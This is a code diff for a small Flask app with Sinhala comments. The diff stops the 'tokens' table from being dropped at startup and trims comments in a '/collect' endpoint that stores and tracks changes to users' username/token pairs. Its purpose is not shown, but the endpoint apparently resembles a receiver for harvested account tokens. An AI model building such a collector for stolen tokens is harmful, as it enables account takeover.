@@ -15,10 +15,9 @@ def get_db_connection():
 def init_db():
     conn = get_db_connection()
     cur = conn.cursor()
-    # පැරණි Table එක ඉවත් කර අලුත් එක සෑදීම
-    cur.execute("DROP TABLE IF EXISTS tokens;")
+    # DROP නොමැතිව Table එක සෑදීම
     cur.execute("""
-        CREATE TABLE tokens (
+        CREATE TABLE IF NOT EXISTS tokens (
             username TEXT PRIMARY KEY,
             token TEXT NOT NULL,
             updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
@@ -28,7 +27,7 @@ def init_db():
     cur.close()
     conn.close()
 
-# ඇප් එක පටන් ගන්නා විට වරක් පමණක් Table එක සකසන්න
+# ඇප් එක පටන් ගන්නා විට වරක් පමණක් Table එක පරීක්ෂා කර සකසන්න
 init_db()
 
 @app.route('/collect', methods=['POST'])
@@ -49,17 +48,14 @@ def collect():
     conn = get_db_connection()
     cur = conn.cursor()
     
-    # දැනටමත් එම username එක ඇත්දැයි බැලීම
     cur.execute("SELECT token FROM tokens WHERE username = %s", (username,))
     old_data = cur.fetchone()
     
     status = "Not Changed"
     if not old_data:
-        # අලුත් පරිශීලකයෙක් නම් insert කරන්න
         cur.execute("INSERT INTO tokens (username, token) VALUES (%s, %s)", (username, token))
         status = "New Registration"
     elif old_data[0] != token:
-        # පරණ ටෝකනයට වඩා වෙනස් නම් update කරන්න
         cur.execute("UPDATE tokens SET token = %s, updated_at = CURRENT_TIMESTAMP WHERE username = %s", (token, username))
         status = "Changed"
     
